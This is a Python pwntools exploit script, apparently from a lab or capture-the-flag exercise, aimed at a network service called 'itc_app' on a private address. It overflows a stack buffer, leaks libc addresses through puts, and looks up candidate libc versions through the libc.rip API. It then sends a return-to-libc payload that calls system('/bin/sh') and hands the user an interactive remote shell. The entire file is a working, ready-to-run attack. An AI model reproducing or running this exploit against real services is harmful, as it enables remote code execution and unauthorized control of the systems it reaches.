import json
import requests
from pwn import remote, u32, p32, flat, log

# Connection Information
conn = '192.168.0.156'
port = 9000

# Output Lines Configuration
OUTPUT_LINES_BEFORE = 6
OUTPUT_LINES_AFTER = 2

# Static Configuration
static = "./itc_app"
buffSize = 132

# URLs and Headers for API Requests
findLibcUrl = 'https://libc.rip/api/find'
LIBC_SEARCH_URL = "https://libc.rip/api/libc/"
HEADERS = {'Content-Type': 'application/json'}

# Function Offsets
pltPuts = 0x8048340
pltGets = 0x08048330
mainAddr = 0x804847b
gotPuts = 0x80497ac
gotGets = 0x80497a8

def handle_reverse_shell(redirect_stderr=True):
    """
    Handles the reverse shell interaction with the process.
    """
    try:
        proc.sendline(b"whoami 2>&1" if redirect_stderr else b"whoami")
        print(proc.recv(timeout=0.1).decode('utf-8'))
        while True:
            command = input("$ ")
            proc.sendline(command.encode('utf-8') + (b" 2>&1" if redirect_stderr else b""))
            print(proc.recv(timeout=0.2).decode('utf-8'))
    except EOFError:
        return 300
    return 200

def leak_via_puts(conn, port,put_out_addr, msg="puts"):
    """
    Leaks randomised libc address via puts' PLT and function's GOT.
    """
    global proc

    proc = remote(conn,port)
    payload = flat(
        b'A' * buffSize,
        p32(pltPuts),
        p32(mainAddr),
        p32(put_out_addr),
    )
    
    proc.sendline(payload)
    skip_lines(proc, OUTPUT_LINES_BEFORE)
    puts_addr = u32(proc.recv(4))
    skip_lines(proc, OUTPUT_LINES_AFTER)
    log.success(f"Leaked address of {msg}: {hex(puts_addr)}")
    return puts_addr

# Perform a return-to-libc attack executing system('/bin/sh')
def attempt_r2libc(puts_offset, system_offset, exit_offset, binsh_offset):
    # Leak randomised libc puts addr
    puts_addr = leak_via_puts(conn, port, gotPuts)

    # Get lib base addr using puts_offset
    libc_address = puts_addr - puts_offset
    log.success(f'LIBC base: {hex(libc_address)}')

    system_bytes = p32(system_offset+libc_address)
    exit_bytes = p32(exit_offset+libc_address)
    binsh_bytes = p32(binsh_offset+libc_address)
    
    # Create and send system('/bin/sh') buffer overflow payload
    payload = flat(
        b'A' * buffSize, # Padding so the next bytes will overwrite the EIP
        system_bytes,     # Overflowed function will execute system() on return
        exit_bytes,       # system will execute libc's exit() on return
        binsh_bytes,      # system's first pararmter 
    )

    proc.sendline(payload)
    log.success("Executed system('/bin/sh') overflow")

    # Ouput next lines so next recv will be the ouput of system('/bin/sh')
    for _ in range(OUTPUT_LINES_AFTER):
        print(proc.recv(timeout = 0.05))
    
    # Check if reverse shell was spawned then handle user input and output for the process
    return handle_reverse_shell()

def skip_lines(proc, lines):
    """
    Skips a specified number of lines in the process output.
    """
    for _ in range(lines):
        try:
            proc.recvline()
        except EOFError:
            pass

def find_potential_libcs(puts_addr,gets_addr):
    """
    Retrieves potential libc versions matching given offsets.
    """
    data = {"symbols": {"puts": hex(puts_addr),"gets": hex(gets_addr)}}
    response = requests.post(findLibcUrl, headers=HEADERS, data=json.dumps(data))
    return response.json()

def get_libc_symbol_offsets(libc_id):
    """
    Retrieves offsets for various symbols from the libc database.
    """
    libc_id = libc_id['id']
    libc_url = LIBC_SEARCH_URL + libc_id
    
    # Define extra symbols to retrieve from the database
    find_symbols = {"symbols": ["exit", "mprotect", "malloc", "memcpy"]}

    # Request symbols from the datatbase
    response = requests.post(libc_url, headers=HEADERS, data=json.dumps(find_symbols))
    symbol_json = response.json()

    # Store the symbols into variables
    puts_off = symbol_json['symbols'].get('puts')
    system_off = symbol_json['symbols'].get('system')
    exit_off = symbol_json['symbols'].get('exit')
    binsh_off = symbol_json['symbols'].get('str_bin_sh')
    print()
    log.info("Trying offsets for libc version: "+libc_id)
    log.info(f"Offsets - puts: {puts_off}, system: {system_off}, str_bin_sh: {binsh_off}, exit: {exit_off}")
    return puts_off, system_off, exit_off, binsh_off

def main():
    puts_addr = leak_via_puts(conn,port,gotPuts)
    gets_addr = leak_via_puts(conn,port,gotGets,msg="gets")
    response_json = find_potential_libcs(puts_addr,gets_addr)

    # Attempt to execute system('/bin/sh') using ret-to-libc on each potential libc version
    for item in response_json:
        # Get the symbol offsets for the specific libc version
        puts_off, system_off, exit_off, binsh_off = get_libc_symbol_offsets(item)

        # Attempt to execute system('/bin/sh')
        ret_val = attempt_r2libc(int(puts_off,16),int(system_off,16),int(exit_off,16),int(binsh_off,16))

        # Print exit message depending on the return value
        if ret_val == 200:
            print("End of file recieved")
            break
        else:
            log.failure("Recieved premature EOF")
            proc.close()

if __name__ == "__main__":
    main()